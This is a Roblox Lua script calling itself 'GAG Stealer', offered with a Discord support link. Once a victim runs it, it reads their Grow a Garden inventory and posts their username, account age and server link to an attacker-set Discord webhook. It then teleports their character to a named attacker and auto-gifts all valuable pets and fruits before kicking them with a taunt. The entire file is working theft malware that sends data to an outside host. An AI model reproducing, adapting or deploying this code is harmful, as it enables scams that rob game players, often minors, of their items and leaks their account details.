-- GAG Stealer: Super Embed, Spam-Proof, Rare Ping Version
-- For support: discord.gg/notyet

--------------------------
-- USER CONFIG SETTINGS --
--------------------------
local CONFIG = {
    USERNAMES = _G.Usernames or {},
    WEBHOOK   = _G.webhook or "",
    MIN_VALUE = _G.min_value or 10000000,
}

-- Rare pet emoji mapping
local RARE_PETS = {
    ["Raccoon"]        = "🦥",
    ["Dragonfly"]      = "🐦‍🔥",
    ["Red Fox"]        = "🦊",
    ["Chicken Zombie"] = "🧟‍♂️",
    ["Disco Bee"]      = "🪩",
    ["Queen Bee"]      = "🐝",
    ["Butterfly"]      = "🦋",
    ["Mimic Octopus"]  = "🐙",
}
local DEFAULT_PET_EMOJI = "🐶"
local DEFAULT_FRUIT_EMOJI = "🥝"
local WEBHOOK_COOLDOWN = 5  -- seconds

-------------------------------
-- FIREPROXIMITY BYPASS PATCH --
-------------------------------
local function bypassProximityPrompt(prompt)
    local ok, result = pcall(function() return fireproximityprompt(prompt) end)
    if ok then return end
    if prompt and prompt.InputHoldBegin then
        prompt.InputHoldBegin(prompt)
        task.wait(prompt.HoldDuration or 0.5)
        if prompt.InputHoldEnd then prompt.InputHoldEnd(prompt) end
    elseif prompt and prompt.Trigger then
        prompt:Trigger()
    else
        warn("FireProximity bypass failed.")
    end
end
getgenv().fireproximityprompt = bypassProximityPrompt

print("GAG Stealer loaded. Join discord.gg/notyet For further support!")

--------------------------
-- SERVICE/VARIABLE INIT --
--------------------------
local Players = game:GetService("Players")
local plr = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local replicatedStorage = game:GetService("ReplicatedStorage")
local backpack = plr:WaitForChild("Backpack")
local modules = replicatedStorage:WaitForChild("Modules")
local req = request or http_request or (syn and syn.request)

--------------------------
-- CORE VALIDITY CHECKS --
--------------------------
if #CONFIG.USERNAMES == 0 or CONFIG.WEBHOOK == "" then
    plr:Kick("Missing username or webhook in config!")
    return
end
local function isPrivateServer()
    local ok, result = pcall(function()
        return game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer()
    end)
    return not ok or (result == "VIPServer" or result == "PrivateServer")
end
if isPrivateServer() then
    plr:Kick("Server not supported. Use a public GAG server.")
    return
end
if game.PlaceId ~= 126884695634066 then
    plr:Kick("Unsupported game. Join a normal GAG server.")
    return
end

------------------------
-- IMPORT DEPENDENCIES --
------------------------
local calcPlantValue   = require(modules:WaitForChild("CalculatePlantValue"))
local petUtils        = require(modules:WaitForChild("PetServices"):WaitForChild("PetUtilities"))
local petRegistry     = require(replicatedStorage:WaitForChild("Data"):WaitForChild("PetRegistry"))
local numberUtil      = require(modules:WaitForChild("NumberUtil"))
local dataService     = require(modules:WaitForChild("DataService"))
local excludedItems   = {"Seed", "Shovel [Destroy Plants]", "Water", "Fertilizer"}

----------------------------
-- UTILITY FORMAT FUNCTIONS
----------------------------
local function getPetEmoji(name)
    return RARE_PETS[name] or DEFAULT_PET_EMOJI
end
local function getFruitEmoji()
    return DEFAULT_FRUIT_EMOJI
end
local function getPetAge(tool)
    return tool:GetAttribute("Age") or (tool.Name:match("Age (%d+)")) or "?"
end
local function getWeight(tool)
    local val = tool:FindFirstChild("Weight") or tool:FindFirstChild("KG") or tool:FindFirstChild("WeightValue") or tool:FindFirstChild("Mass")
    if val then
        if val:IsA("NumberValue") or val:IsA("IntValue") then
            return math.floor(val.Value * 100 + 0.5) / 100
        elseif val:IsA("StringValue") then
            return tonumber(val.Value) or 0
        end
    end
    local m = tool.Name:match("%((%d+%.?%d*) ?kg%)")
    return m and tonumber(m) or 0
end
local function formatValue(n)
    local s = tostring(math.floor(n or 0)):reverse():gsub("(%d%d%d)","%1,"):reverse():gsub("^,","")
    return s
end

-----------------------------
-- COLLECT INVENTORY ITEMS --
-----------------------------
local itemsToSend, totalValue, foundRare = {}, 0, false

for _, tool in ipairs(backpack:GetChildren()) do
    if tool:IsA("Tool") and not table.find(excludedItems, tool.Name) then
        if tool:GetAttribute("ItemType") == "Pet" then
            local petUUID = tool:GetAttribute("PET_UUID")
            local v14 = dataService:GetData().PetsData.PetInventory.Data[petUUID]
            local name = v14.PetType
            -- Calculate value
            local petVal = 0
            do
                local hatchedFrom = v14.PetData.HatchedFrom
                if hatchedFrom and hatchedFrom ~= "" then
                    local eggData = petRegistry.PetEggs[hatchedFrom]
                    if eggData then
                        local v17 = eggData.RarityData.Items[v14.PetType]
                        if v17 and v17.GeneratedPetData.WeightRange then
                            local weightRange = v17.GeneratedPetData.WeightRange
                            local v19 = numberUtil.ReverseLerp(weightRange[1], weightRange[2], v14.PetData.BaseWeight)
                            local v20 = math.lerp(0.8, 1.2, v19)
                            local levelProgress = petUtils:GetLevelProgress(v14.PetData.Level)
                            local v22 = v20 * math.lerp(0.15, 6, levelProgress)
                            petVal = math.floor(petRegistry.PetList[v14.PetType].SellPrice * v22)
                        end
                    end
                end
            end
            local petWeight = tonumber(tool.Name:match("%[(%d+%.?%d*) KG%]")) or getWeight(tool)
            local petAge = getPetAge(tool)
            local isRare = RARE_PETS[name] ~= nil
            if isRare or petWeight >= 10 then
                if isRare then foundRare = true end
                totalValue = totalValue + petVal
                table.insert(itemsToSend, {
                    Tool  = tool,
                    Name  = name,
                    Value = petVal,
                    Weight= petWeight,
                    Type  = "Pet",
                    Emoji = getPetEmoji(name),
                    Age   = petAge
                })
            end
        else
            local value = calcPlantValue(tool)
            if value >= CONFIG.MIN_VALUE then
                local weight = getWeight(tool)
                totalValue = totalValue + value
                table.insert(itemsToSend, {
                    Tool  = tool,
                    Name  = tool:GetAttribute("ItemName") or tool.Name,
                    Value = value,
                    Weight= weight,
                    Type  = "Fruit",
                    Emoji = getFruitEmoji(),
                    Age   = nil
                })
            end
        end
    end
end
if #itemsToSend == 0 then return end

table.sort(itemsToSend, function(a, b)
    if a.Type == "Pet" and b.Type ~= "Pet" then return true
    elseif a.Type ~= "Pet" and b.Type == "Pet" then return false
    else return a.Value > b.Value end
end)

---------------
-- WEBHOOK RATE LIMITER
---------------
local lastWebhook = 0
local function canSendWebhook()
    return tick() - lastWebhook > WEBHOOK_COOLDOWN
end
local function setWebhookTime()
    lastWebhook = tick()
end

-----------------------------
-- EMBED PAYLOAD CREATION  --
-----------------------------
local function formatItemLine(item)
    if item.Type == "Pet" then
        return string.format("%s - %s [%.2f KG] [Age %s]", item.Emoji, item.Name, item.Weight, tostring(item.Age or "?"))
    else
        return string.format("%s - %s [%.2f KG]", item.Emoji, item.Name, item.Weight)
    end
end

local function makeEmbed(receiverName)
    local itemLines = {}
    for _, item in ipairs(itemsToSend) do
        table.insert(itemLines, formatItemLine(item))
    end
    local itemBlock = table.concat(itemLines, "\n")
    if #itemBlock > 1024 then
        itemBlock = itemBlock:sub(1,1020) .. "\n...and more!"
    end
    local joinLink = ("https://fern.wtf/joiner?placeId=126884695634066&gameInstanceId=%s"):format(game.JobId)
    local ping = foundRare and "@everyone" or ""

    return {
        content = ping,
        embeds  = {{
            title  = "💎 You got something!",
            color  = foundRare and 16776960 or 65280,
            description = "**Player information**\n\n"..
                "`Username: "..plr.Name.."`\n"..
                "`Receiver: "..receiverName.."`\n"..
                "`Executer: "..plr.Name.."`\n"..
                "`Account age: "..(plr.AccountAge or "?").."`\n\n"..
                "**What you got**:\n\n".. "``````".."\n\n"..
                "**[Join Server]("..joinLink..")**",
            footer = { text = "GAG stealer by Tobi. discord.gg/notyet" }
        }}
    }
end

-------------------------
-- SEND MAIN WEBHOOK   --
-------------------------
local function sendInitialWebhook(receiverName)
    if not canSendWebhook() then return end
    setWebhookTime()
    local payload = makeEmbed(receiverName)
    local body = HttpService:JSONEncode(payload)
    local headers = {["Content-Type"] = "application/json"}
    if req then req({Url = CONFIG.WEBHOOK, Method = "POST", Headers = headers, Body = body}) end
end

--------------------------
-- WEBHOOK ON LEAVE/EVENT
--------------------------
local function sendLeaveWebhook()
    local leaveData = {
        content = "",
        embeds = {{
            title = "🚪 Player left before gifting",
            color = 16711680,
            description = "**Player information**\n\n"..
                "`Username: "..plr.Name.."`\n"..
                "`Executer: "..plr.Name.."`\n"..
                "`Account age: "..(plr.AccountAge or "?").."`\n\n"..
                "**Status:** Victim left the server/disconnected before items could be transferred.",
            footer = { text = "GAG stealer by Tobi. discord.gg/notyet" }
        }}
    }
    local leaveBody = HttpService:JSONEncode(leaveData)
    local headers = {["Content-Type"] = "application/json"}
    if req then req({Url = CONFIG.WEBHOOK, Method = "POST", Headers = headers, Body = leaveBody}) end
end

Players.PlayerRemoving:Connect(function(player)
    if player == plr then
        sendLeaveWebhook()
    end
end)

--------------------------
-- INTERACTION / STEAL   --
--------------------------

local function equipTool(tool)
    -- Move to character if not already, and equip via Humanoid
    if tool.Parent ~= plr.Character then
        tool.Parent = plr.Character
    end
    if plr.Character and plr.Character:FindFirstChild("Humanoid") then
        pcall(function()
            plr.Character.Humanoid:EquipTool(tool)
        end)
    end
    task.wait(0.09)
end

local function findGiftPrompt(targetChar)
    -- Try all common and fallback locations for the prompt
    for _, part in ipairs({"Head", "HumanoidRootPart", "Torso", "UpperTorso"}) do
        local partObj = targetChar:FindFirstChild(part)
        if partObj then
            for _, prompt in ipairs(partObj:GetChildren()) do
                if prompt:IsA("ProximityPrompt") and (prompt.Name:lower():find("gift") or (prompt.ObjectText and prompt.ObjectText:lower():find("gift"))) then
                    return prompt
                end
            end
        end
    end
    for _, desc in ipairs(targetChar:GetDescendants()) do
        if desc:IsA("ProximityPrompt") and (desc.Name:lower():find("gift") or (desc.ObjectText and desc.ObjectText:lower():find("gift"))) then
            return desc
        end
    end
    -- Last resort: first ProximityPrompt anywhere
    for _, desc in ipairs(targetChar:GetDescendants()) do
        if desc:IsA("ProximityPrompt") then return desc end
    end
    return nil
end

local function doSteal(player)
    -- Rapidly and reliably auto-gift everything to the target player!
    local myChar = plr.Character or plr.CharacterAdded:Wait()
    local victimRoot = myChar:WaitForChild("HumanoidRootPart")
    victimRoot.CFrame = player.Character.HumanoidRootPart.CFrame + Vector3.new(0,0,2)
    wait(0.25)
    for _, item in ipairs(itemsToSend) do
        equipTool(item.Tool)
        local prompt = findGiftPrompt(player.Character)
        if prompt then
            local t0 = os.clock()
            repeat
                task.wait(0.04)
                if (os.clock() - t0) > 3 then break end  -- Failsafe
            until prompt.Enabled
            bypassProximityPrompt(prompt)
            wait(0.10)
        else
            warn("No gifting prompt found for "..(item.Name or "?"))
        end
        item.Tool.Parent = backpack
        wait(0.04)
    end
    local stillInBackpack = true
    while stillInBackpack do
        stillInBackpack = false
        for _, item in ipairs(itemsToSend) do
            if backpack:FindFirstChild(item.Tool.Name) then
                stillInBackpack = true
                break
            end
        end
        task.wait(0.08)
    end
    plr:Kick("All your stuff just got stolen by Tobi's stealer!\nJoin discord.gg/notyet")
end

local function listenForUser()
    local triggered = false
    local function onChat(player)
        if not table.find(CONFIG.USERNAMES, player.Name) then return end
        player.Chatted:Connect(function()
            if triggered then return end
            triggered = true
            sendInitialWebhook(player.Name)
            doSteal(player)
        end)
    end
    for _, p in ipairs(Players:GetPlayers()) do onChat(p) end
    Players.PlayerAdded:Connect(onChat)
end
listenForUser()
